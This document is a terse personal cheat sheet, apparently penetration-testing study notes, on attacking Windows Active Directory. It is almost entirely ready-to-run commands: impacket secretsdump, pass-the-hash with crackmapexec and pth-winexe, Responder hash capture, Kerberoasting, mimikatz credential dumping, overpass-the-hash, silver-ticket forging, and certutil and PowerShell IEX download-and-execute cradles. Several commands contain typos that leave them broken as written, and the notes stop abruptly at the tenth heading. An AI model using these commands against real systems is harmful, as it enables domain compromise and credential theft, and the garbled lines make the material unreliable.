

------------------------------------------------------------------------------------------------

1)Pass the hash 
	If you have any password and user use impacket tools
	you have local domain and password. You can dump sam file:
		#$ impacket-secretsdump HACKERDomanin.loacal/hguy:Password@192.168.35.144
		
	
	you will get some hashes and users (I found hash and user 'happy guy'):
		#$ crackmapexec smb 192.168.35.0/24 -U 'happy guy' -H aadsdfdsf....sdf --loacl-auth
	

2) smb enum :
	#$ smbclient -N -L //10.10.10.123/  	
	or 
	#$ smbclient -N -L 10.10.10.123
 	or 
	#$ smbclient -N -L ////10.10.10.123//


	#$ smbmap -H 10.10.10.123

	#$ smbclient -N //10.10.10.123/general

	
3) NTLM hash:
	cach hash:
	#$ sudo responder -I eth0 -rdwv 


	use hashcat to crack entire recived data:

4) AD port numbers:

	#$ nslookup http://10.10.10.29:53

	zone transfer:
	#$ dnsrecon -d 10.10.10.103 -t axfr

	smb/netbios 139/445
	#$ smbclient -N -L //10.10.10.103

	#$ smbmap -H 10.10.10.103 -u anonymous -R



5) share files / download:
	c:\> certutil -split -f -urlcache http://10.10.14.15/test.txt

	evil-winrm upload:
	evil-winrm after connecting you can use upload:
	#$ evil-winrm -u user -p Password1 -i 10.10.10.161
	PS C:\> upload test.txt

	Powershell:
	C:\>powershell -c 'IEX(New-Object Net.WebClient).DownloadString("http://host/file.txt")'

	impacket:
	#$ impacket-smbserver -username UseName -password Password shar . -smb2support
	
	C:\> net use \\10.10.14.15\share /u:UseName Password 
	C:\> cd \\10.10.14.15\share



6) Windows privilige escalation resources:

	https://sushant747.gitbooks.io/total-oscp-guide/content/
		- search passwords in xml and ini file  (but change 'password' to 'pass' or 'key'0     
		- serch other files .config
		- search in registry 

	https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters

		
Priv Escalation what has to be done:
	c:\> systeminfo
	c:\> whoami /priv

	c:\> ipconfig
	c:\> ipconfig /all
		
	c:\> route print     <- connect to internal  network 
	
	c:\> arp -a 

	c:\> netastat -ano

winpeas many versions:
	https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS


Kerberosting etc:


└─$ impacket-GetADUsers -all active.htb/SVC_TGS -dc-ip 10.10.10.100 


└─$ impacket-GetUserSPNs   'active.htb/SVC_TGS:GPPstillStandingStrong2k18'  -request -dc-ip 10.10.10.100 




7)   Pass the hash - if you have NTLM hash ( only if server or servic use NTLM authentications)   , authenticate using NTLM hash

	kali: 
		kali@kali:~$ pth-winexe -U User%aabbb3b4...ee:2892d //10.10.0.22 cmd
		
		
		
8)   Overpass the hash -    use NTLM hash to get full kerberos TGT to to get full access. Use NTLM to get to Kerberos tickets	. (But only can use TGT for machine it was created for)
	example:  if you compromised machine where jadmin is/was authenticated (machin is hashing his credentials)
	
	windows:
		mimikatz# sekurlas::logonpasswords                           <-- dump hashes 
		
		mimikatz # sekurlsa::pth /user:jadmin /domain:corp.com /ntlm:e2b475.....327 /run:PowerShell.exe                <- get new powershell session to execute commands as jadmin
				you will get :
					PS C:\Windows\system32> net use \\dc01     <-- log to network share sing TGT
					
					PS C:\Windows\system32> klist         <-- list TGT , TGS etc (if used: "net use \\dc01"  fires thn you get creds from network if not it will be local)			
		
	
					PS C:\Windows\system32> PsExec.exe \\dc01 cmd.exe          <-- use jadmin to log into domain controller
					
			
			
9) Pass the Ticket   - use TGS to log to acces other machines (offers flexibility not additionall access )	  (connected to silver ticket , get sid users)				 
					
		
	windows:
		C:\Users\offsec.CORT> whoami /user
		
		USER INFORATION SID 
		=============== ===============================
		corp\offsec     S-1-5-21-1895...5541-2947..9466-4388...9864-1104    <-- 1104 is not part of SID
	
	get SID from above command and crack he silver ticket: 	

		
		mimikatz# kerberos::purge               <--  check existing kerberos tickes
		
		mimikatz# kerberos::list               <--  veryfy the purge
		
		
		mimikatz# kerberos::golden /user:offsec.com /sid:S-1-5-21-1895..5541-2947..9466-43...9864 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B47...27/ /ptt
						
		mimikatz# kerberos::list               <--  veryfy




10) Distributed component object model:
